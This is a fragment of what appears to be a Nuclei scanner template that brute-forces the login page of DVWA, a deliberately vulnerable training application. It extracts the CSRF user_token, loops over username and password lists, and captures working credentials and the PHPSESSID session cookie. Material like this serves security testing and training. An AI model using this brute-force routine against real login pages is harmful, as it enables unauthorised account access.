    - "password"
    - "charley"
    - "abc123"
    - "letmein"

flow: |
  http(1);
  for (let user of iterate(template["usernames"])) {
    set("user", user);
    for (let pass of iterate(template["passwords"])) {
      set("pass", pass);
      http(2);
    }
  }


http:
  # Step 1: Authenticate and get PHPSESSID and user_token
  - raw:
      - |
        GET /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Connection: close

    extractors:
      - type: regex
        name: token
        group: 1
        part: body
        regex:
          - "name='user_token' value='([a-f0-9]+)'"
        internal: true

  - raw:
      - |
        POST /DVWA/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept: */*

        username={{user}}&password={{pass}}&user_token={{token}}&Login=Login

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Location: index.php"

    extractors:
      - type: regex
        name: phpsess
        part: header
        group: 1
        regex:
          - PHPSESSID=([a-zA-Z0-9+]{26})
        internal: true
      - type: dsl
        name: user pass
        dsl:
          - "concat('Username: ',user,' Password: ', pass, ' PHPSESSID: ', phpsess)"
